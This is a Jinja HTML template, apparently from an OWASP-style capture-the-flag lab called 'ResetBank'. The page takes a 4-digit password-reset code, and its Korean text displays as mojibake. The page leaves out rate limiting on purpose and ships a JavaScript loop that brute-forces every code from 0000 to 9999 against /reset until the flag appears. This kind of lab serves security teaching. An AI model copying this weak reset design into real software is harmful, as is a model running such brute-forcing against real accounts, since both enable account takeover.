<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8"/>
  <title>ì½”ë“œ ì…ë ¥ - ResetBank</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background:#0d1117; color:#c9d1d9;
      font-family:'Courier New',monospace;
      display:flex; justify-content:center;
      align-items:center; min-height:100vh; flex-direction:column; gap:20px;
    }
    .box {
      background:#161b22; border:1px solid #30363d;
      border-radius:10px; padding:40px;
      width:100%; max-width:420px;
    }
    .box h2 { color:#f0f6fc; font-size:1.3rem; margin-bottom:8px; text-align:center; }
    .box p { color:#8b949e; font-size:0.8rem; text-align:center; margin-bottom:28px; }
    label { display:block; font-size:0.8rem; color:#8b949e; margin-bottom:6px; }
    input[type="text"], input[type="number"] {
      width:100%; padding:10px 14px;
      background:#0d1117; border:1px solid #30363d;
      border-radius:6px; color:#f0f6fc;
      font-family:'Courier New',monospace; font-size:0.9rem;
      margin-bottom:18px; outline:none;
    }
    input:focus { border-color:#a855f7; }
    button {
      width:100%; padding:10px; background:#a855f7;
      border:none; border-radius:6px; color:#fff;
      font-size:0.9rem; font-family:'Courier New',monospace;
      cursor:pointer; transition:background 0.2s;
    }
    button:hover { background:#9333ea; }
    .error {
      background:#3d1f1f; border:1px solid #f85149;
      color:#f85149; padding:10px 14px;
      border-radius:6px; font-size:0.8rem; margin-bottom:18px;
    }
    .hint {
      margin-top:16px; padding:12px 14px;
      background:#1c2128; border:1px solid #30363d;
      border-radius:6px; font-size:0.75rem; color:#8b949e; line-height:1.7;
    }
    .hint code {
      background:#0d1117; padding:2px 6px;
      border-radius:4px; color:#a855f7;
    }
    .brute-box {
      background:#161b22; border:1px solid #30363d;
      border-radius:10px; padding:24px;
      width:100%; max-width:420px;
    }
    .brute-box h3 { color:#f59e0b; font-size:0.9rem; margin-bottom:12px; }
    .brute-box p { color:#8b949e; font-size:0.8rem; margin-bottom:16px; line-height:1.7; }
    .brute-btn {
      width:100%; padding:10px; background:#2d1e00;
      border:1px solid #d97706; border-radius:6px; color:#f59e0b;
      font-size:0.85rem; font-family:'Courier New',monospace;
      cursor:pointer; transition:all 0.2s;
    }
    .brute-btn:hover { background:#3d2a00; }
    #brute-status { margin-top:12px; font-size:0.8rem; color:#8b949e; min-height:20px; }
  </style>
</head>
<body>
<div class="box">
  <h2>ğŸ”¢ ì¸ì¦ ì½”ë“œ ì…ë ¥</h2>
  <p>ì´ë©”ì¼ë¡œ ì „ì†¡ëœ 4ìë¦¬ ì½”ë“œë¥¼ ì…ë ¥í•˜ì„¸ìš”.</p>

  {% if error %}
  <div class="error">âš ï¸ {{ error }}</div>
  {% endif %}

  <form method="POST" action="/reset" id="resetForm">
    <input type="hidden" name="username" value="{{ username }}"/>
    <label>ì•„ì´ë””</label>
    <input type="text" value="{{ username }}" disabled/>
    <label>ì¸ì¦ ì½”ë“œ (4ìë¦¬)</label>
    <input type="text" name="token" id="tokenInput" placeholder="0000" maxlength="4" autocomplete="off"/>
    <button type="submit">í™•ì¸ â†’</button>
  </form>

  <div class="hint">
    ğŸ’¡ íŒíŠ¸: 4ìë¦¬ ìˆ«ì ì½”ë“œëŠ” <code>0000</code> ~ <code>9999</code> ë²”ìœ„ì…ë‹ˆë‹¤.<br/>
    ì´ 10,000ê°€ì§€ ê²½ìš°ì˜ ìˆ˜ â€” ë¸Œë£¨íŠ¸í¬ìŠ¤ê°€ ê°€ëŠ¥í• ê¹Œìš”?
  </div>
</div>

<div class="brute-box">
  <h3>âš¡ ìë™ ë¸Œë£¨íŠ¸í¬ìŠ¤ ì‹œë„</h3>
  <p>ì„œë²„ì— íšŸìˆ˜ ì œí•œì´ ì—†ìŠµë‹ˆë‹¤.<br/>ë²„íŠ¼ì„ ëˆ„ë¥´ë©´ 0000ë¶€í„° ìë™ìœ¼ë¡œ ì‹œë„í•©ë‹ˆë‹¤.</p>
  <button class="brute-btn" onclick="startBrute()">ğŸ”“ ë¸Œë£¨íŠ¸í¬ìŠ¤ ì‹œì‘</button>
  <div id="brute-status"></div>
</div>

<script>
  let running = false;

  async function startBrute() {
    if (running) return;
    running = true;
    const status = document.getElementById('brute-status');
    const username = '{{ username }}';

    for (let i = 0; i <= 9999; i++) {
      const token = String(i).padStart(4, '0');
      status.textContent = `ì‹œë„ ì¤‘: ${token} (${i}/9999)`;

      const res = await fetch('/reset', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `username=${username}&token=${token}`
      });
      const html = await res.text();

      if (html.includes('OWASP{')) {
        status.innerHTML = `âœ… ì„±ê³µ! í† í°: <strong style="color:#3fb950">${token}</strong> â†’ í˜ì´ì§€ ì´ë™ ì¤‘...`;
        setTimeout(() => { window.location.href = '/reset'; }, 500);

        // ì„±ê³µí•œ í† í°ìœ¼ë¡œ í¼ ì œì¶œ
        document.getElementById('tokenInput').value = token;
        document.getElementById('resetForm').submit();
        return;
      }
      await new Promise(r => setTimeout(r, 10));
    }
    status.textContent = 'ì‹¤íŒ¨: í† í°ì„ ì°¾ì§€ ëª»í–ˆìŠµë‹ˆë‹¤.';
    running = false;
  }
</script>
</body>
</html>